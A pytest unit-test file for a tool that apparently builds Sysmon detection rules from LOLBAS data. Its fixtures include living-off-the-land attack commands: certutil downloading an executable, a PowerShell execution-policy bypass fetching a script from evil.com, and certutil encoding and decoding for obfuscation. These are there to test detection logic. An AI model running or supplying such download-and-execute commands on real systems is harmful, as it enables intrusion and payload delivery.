"""Unit tests for LOLBin models."""

import pytest

from lolbas_sysmon.models import Command, LOLBin, MitreInfo


class TestCommand:
    """Tests for Command dataclass."""

    def test_extract_flags_basic(self):
        """Test basic flag extraction from command."""
        cmd = Command(
            command="certutil.exe -urlcache -split -f http://example.com/file.exe", description="Download file", mitre_id="T1105", category="Download"
        )
        flags = cmd.extract_flags()
        assert "-urlcache" in flags
        assert "-split" in flags
        assert "-f" in flags

    def test_extract_flags_with_slashes(self):
        """Test flag extraction with forward slash flags."""
        cmd = Command(command="cmd.exe /c whoami", description="Execute command", mitre_id="T1059", category="Execute")
        flags = cmd.extract_flags()
        assert "/c" in flags

    def test_extract_flags_removes_urls(self):
        """Test that URLs are not extracted as flags."""
        cmd = Command(
            command="powershell.exe -ep bypass https://evil.com/script.ps1", description="Download and execute", mitre_id="T1059.001", category="Execute"
        )
        flags = cmd.extract_flags()
        assert "-ep" in flags
        assert "https" not in "".join(flags)

    def test_extract_flags_empty_command(self):
        """Test flag extraction with no flags."""
        cmd = Command(command="notepad.exe", description="Open notepad", mitre_id=None, category="Execute")
        flags = cmd.extract_flags()
        assert flags == []

    def test_extract_flags_unique(self):
        """Test that duplicate flags are deduplicated."""
        cmd = Command(command="cmd.exe /c dir /c", description="Dir command", mitre_id=None, category="Execute")
        flags = cmd.extract_flags()
        assert flags.count("/c") == 1


class TestLOLBin:
    """Tests for LOLBin dataclass."""

    @pytest.fixture
    def sample_lolbin(self):
        """Create a sample LOLBin for testing."""
        return LOLBin(
            name="certutil.exe",
            original_filename="CertUtil.exe",
            description="Certificate utility",
            commands=[
                Command(
                    command="certutil.exe -urlcache -f http://example.com/file.exe", description="Download file from URL", mitre_id="T1105", category="Download"
                ),
                Command(command="certutil.exe -encode input.exe output.txt", description="Encode file to base64", mitre_id="T1027", category="Encode"),
                Command(command="certutil.exe -decode input.txt output.exe", description="Decode base64 file", mitre_id="T1140", category="Decode"),
            ],
            mitre_ids=["T1105", "T1027", "T1140"],
        )

    def test_has_category_true(self, sample_lolbin):
        """Test has_category returns True for existing category."""
        assert sample_lolbin.has_category("Download") is True
        assert sample_lolbin.has_category("Encode") is True

    def test_has_category_false(self, sample_lolbin):
        """Test has_category returns False for non-existing category."""
        assert sample_lolbin.has_category("Execute") is False
        assert sample_lolbin.has_category("NonExistent") is False

    def test_get_description_for_category(self, sample_lolbin):
        """Test getting description for specific category."""
        desc = sample_lolbin.get_description_for_category("Download")
        assert desc == "Download file from URL"

    def test_get_description_fallback(self, sample_lolbin):
        """Test fallback to general description."""
        desc = sample_lolbin.get_description_for_category("NonExistent")
        assert desc == "Certificate utility"

    def test_get_command_flags_for_category(self, sample_lolbin):
        """Test getting flags for specific category."""
        flags = sample_lolbin.get_command_flags_for_category("Download")
        assert "-urlcache" in flags
        assert "-f" in flags

    def test_get_mitre_info_for_category(self, sample_lolbin):
        """Test getting MITRE info for category."""
        technique_names = {"T1105": "Ingress Tool Transfer"}
        mitre_infos = sample_lolbin.get_mitre_info_for_category("Download", technique_names)

        assert len(mitre_infos) == 1
        assert mitre_infos[0].technique_id == "T1105"
        assert mitre_infos[0].technique_name == "Ingress Tool Transfer"

    def test_get_mitre_info_without_names(self, sample_lolbin):
        """Test MITRE info uses ID as name when no mapping provided."""
        mitre_infos = sample_lolbin.get_mitre_info_for_category("Download")

        assert len(mitre_infos) == 1
        assert mitre_infos[0].technique_id == "T1105"
        assert mitre_infos[0].technique_name == "T1105"

    def test_get_executable_condition_with_original_filename(self, sample_lolbin):
        """Test executable condition uses OriginalFileName when available."""
        tag, value = sample_lolbin.get_executable_condition()
        assert tag == "OriginalFileName"
        assert value == "CertUtil.exe"

    def test_get_executable_condition_without_original_filename(self):
        """Test executable condition uses Image when no OriginalFileName."""
        lolbin = LOLBin(name="evil.exe", original_filename=None, description="Evil binary", commands=[], mitre_ids=[])
        tag, value = lolbin.get_executable_condition()
        assert tag == "Image"
        assert value == "\\evil.exe"

    def test_get_commands_for_category(self, sample_lolbin):
        """Test getting commands for specific category."""
        commands = sample_lolbin.get_commands_for_category("Download")
        assert len(commands) == 1
        assert commands[0].category == "Download"


class TestMitreInfo:
    """Tests for MitreInfo dataclass."""

    def test_mitre_info_creation(self):
        """Test MitreInfo creation."""
        info = MitreInfo(technique_id="T1218.011", technique_name="Rundll32")
        assert info.technique_id == "T1218.011"
        assert info.technique_name == "Rundll32"
